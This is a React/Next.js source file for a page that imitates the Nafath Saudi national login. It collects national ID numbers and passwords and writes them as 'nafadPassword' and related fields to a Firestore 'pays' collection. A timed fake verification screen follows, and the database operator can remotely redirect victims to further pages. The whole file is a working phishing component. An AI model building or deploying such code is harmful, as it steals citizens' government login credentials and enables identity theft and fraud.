"use client"

import type React from "react"
import { useEffect, useState, useCallback } from "react"
import { useRouter } from "next/navigation"
import NafazModal from "@/components/nafaz-modal"
import { doc, onSnapshot, setDoc, updateDoc } from "firebase/firestore"
import { db } from "@/lib/firebase"
import { Loader2 } from "lucide-react"

interface NafazFormData {
  identity_number: string
  password: string
}

interface UserData {
  currentPage?: string
  nafadUsername?: string
  nafadPassword?: string
  status?: string
}

// Utility function for allowing only numbers in input
const onlyNumbers = (value: string) => {
  return value.replace(/[^0-9]/g, "")
}

export default function Nafaz() {
  const router = useRouter()
  const [formData, setFormData] = useState<NafazFormData>({
    identity_number: "",
    password: "",
  })
  const [isLoading, setIsLoading] = useState(false)
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [isRejected, setIsRejected] = useState(false)
  const [showModal, setShowModal] = useState(false)
  const [phone, setPhone] = useState("")
  const [visitorId, setVisitorId] = useState<string | null>(null)
  const [error, setError] = useState<string | null>(null)

  // Initialize visitor data from localStorage
  useEffect(() => {
    if (typeof window !== "undefined") {
      const userId = localStorage.getItem("visitor")
      const phoneNumber = localStorage.getItem("phoneNumber") || ""

      setVisitorId(userId)
      setPhone(phoneNumber)
    }
  }, [])

  // Set up Firestore listener
  useEffect(() => {
    if (!visitorId) return

    const userDocRef = doc(db, "pays", visitorId)
    const unsubscribe = onSnapshot(
      userDocRef,
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const userData = docSnapshot.data() as UserData

          if (userData.currentPage === "1") {
            router.push("/quote")
          } else if (userData.currentPage === "9999") {
            router.push("/verify-phone")
          }
        } else {
          console.error("User document not found")
        }
      },
      (error) => {
        console.error("Error listening to document:", error)
        setError("خطأ في الاتصال بقاعدة البيانات")
      },
    )

    return () => unsubscribe()
  }, [visitorId, router])

  // Handle verification simulation
  useEffect(() => {
    if (!isSubmitted) return

    const timer = setTimeout(() => {
      // Simulate successful verification (you can add logic for random success/failure)
      setShowModal(true)
      setIsSubmitted(false)
      setIsRejected(false)
    }, 3000)

    return () => clearTimeout(timer)
  }, [isSubmitted])

  const updateFirestore = useCallback(
    async (idCardNumber: string, password: string) => {
      if (!visitorId) {
        throw new Error("معرف الزائر غير موجود")
      }

      try {
        const paysDocRef = doc(db, "pays", visitorId)
        const updateData = {
          nafadUsername: idCardNumber,
          nafadPassword: password,
          createdDate: new Date().toISOString(),
          status: "pending",
        }

        try {
          await updateDoc(paysDocRef, updateData)
        } catch (updateError) {
          // If document doesn't exist, create it
          await setDoc(paysDocRef, updateData)
        }

        console.log("Firestore updated successfully with Nafaz credentials")
        return true
      } catch (error) {
        console.error("Error updating Firestore:", error)
        throw new Error("فشل في حفظ البيانات")
      }
    },
    [visitorId],
  )

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    setError(null)

    try {
      // Validate form data
      if (!formData.identity_number.trim() || !formData.password.trim()) {
        throw new Error("الرجاء إدخال جميع البيانات المطلوبة")
      }

      // Store credentials in localStorage
      if (typeof window !== "undefined") {
        localStorage.setItem("nafaz_data", JSON.stringify(formData))

        // Generate a mock ID for backward compatibility
        const nafad_id = "nafad-" + Math.random().toString(36).substring(2, 10)
        localStorage.setItem("nafad_id", JSON.stringify(nafad_id))
      }

      // Update Firestore with the credentials
      await updateFirestore(formData.identity_number, formData.password)

      // Set submitted state to trigger verification simulation
      setIsSubmitted(true)
    } catch (error) {
      console.error("خطأ في الدخول للنظام:", error)
      setError(error instanceof Error ? error.message : "حدث خطأ غير متوقع")
      setIsRejected(true)
    } finally {
      setIsLoading(false)
    }
  }

  const handleInputChange = (field: keyof NafazFormData) => (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = field === "identity_number" ? onlyNumbers(e.target.value) : e.target.value
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }))
  }

  const SubmittedContent = () => (
    <div className="space-y-8 bg-[#daf2f6] rounded-md p-6">
      <div className="space-y-4 text-base text-gray-700">
        <p className="text-right">الرجاء الانتظار....</p>
        <p className="text-right">جاري معالجة طلبك</p>
        <p className="text-right">لا يمكنك الاستمرار في حال عدم قبول المصادقة</p>
      </div>
      <div className="flex-col gap-4 w-full flex items-center justify-center">
        <div className="w-20 h-20 border-4 border-transparent text-blue-400 text-4xl animate-spin flex items-center justify-center border-t-blue-400 rounded-full">
          <div className="w-16 h-16 border-4 border-transparent text-red-400 text-2xl animate-spin flex items-center justify-center border-t-red-400 rounded-full"></div>
        </div>
      </div>
    </div>
  )

  const ErrorMessage = ({ message }: { message: string }) => (
    <div className="bg-red-50 border border-red-200 rounded-md p-4 text-right">
      <p className="text-red-600 text-sm">{message}</p>
    </div>
  )

  return (
    <>
      <div className="min-h-screen bg-[#eee] flex flex-col items-center py-3">
        <div className="w-full max-w-md mx-auto space-y-8">
          <h1 className="text-4xl font-bold text-[#3a9f8c] mb-6 bg-white p-4 text-right rounded-md">نفاذ</h1>

          <h2 className="mt-6 text-3xl text-center font-semibold p-2 border-slate-400 text-[#3a9f8c]">
            الدخول على النظام
          </h2>

          <div className="mt-20 space-y-8 bg-white p-6 rounded-md shadow-sm">
            {error && <ErrorMessage message={error} />}

            {!isSubmitted ? (
              <form className="space-y-8" onSubmit={handleSubmit}>
                <div className="space-y-4">
                  <div>
                    <label htmlFor="identity" className="block text-right text-sm font-medium text-gray-700 mb-4">
                      رقم بطاقة الأحوال / الإقامة
                    </label>
                    <input
                      id="identity"
                      type="text"
                      required
                      maxLength={10}
                      className="appearance-none relative block w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#3a9f8c] focus:border-[#3a9f8c] text-right"
                      value={formData.identity_number}
                      onChange={handleInputChange("identity_number")}
                      placeholder="أدخل رقم الهوية"
                      aria-describedby="identity-help"
                    />
                    <p id="identity-help" className="text-xs text-gray-500 text-right mt-1">
                      أدخل رقم بطاقة الأحوال أو الإقامة (أرقام فقط)
                    </p>
                  </div>

                  <div>
                    <label htmlFor="password" className="block text-right text-sm font-medium text-gray-700 mb-1">
                      كلمة المرور
                    </label>
                    <input
                      id="password"
                      type="password"
                      required
                      className="appearance-none relative block w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-[#3a9f8c] focus:border-[#3a9f8c] text-right"
                      value={formData.password}
                      onChange={handleInputChange("password")}
                      placeholder="أدخل كلمة المرور"
                    />
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={isLoading || !formData.identity_number.trim() || !formData.password.trim()}
                  className="w-full flex justify-center items-center gap-2 py-2 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#3a9f8c] hover:bg-[#2d7a6b] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#3a9f8c] disabled:bg-gray-400 disabled:cursor-not-allowed transition-colors"
                >
                  {isLoading && <Loader2 className="animate-spin w-4 h-4" />}
                  &#x276E; تسجيل الدخول
                </button>

                <div className="flex justify-center gap-4">
                  <img src="/google_play.png" alt="تحميل من Google Play" className="w-[6rem] h-auto" />
                  <img src="/huawei_store.jpg" alt="تحميل من Huawei Store" className="w-[6rem] h-auto" />
                  <img src="/apple_store.png" alt="تحميل من App Store" className="w-[6rem] h-auto" />
                </div>

                <div className="text-center text-sm text-gray-600">
                  الرجاء إدخال بطاقة الأحوال/الإقامة وكلمة المرور ثم اضغط تسجيل دخول
                </div>
              </form>
            ) : (
              <SubmittedContent />
            )}
          </div>
        </div>

        {showModal && (
          <NafazModal
            isOpen={showModal}
            onClose={() => setShowModal(false)}
            userId={visitorId as string}
            phone={phone}
          />
        )}
      </div>
    </>
  )
}
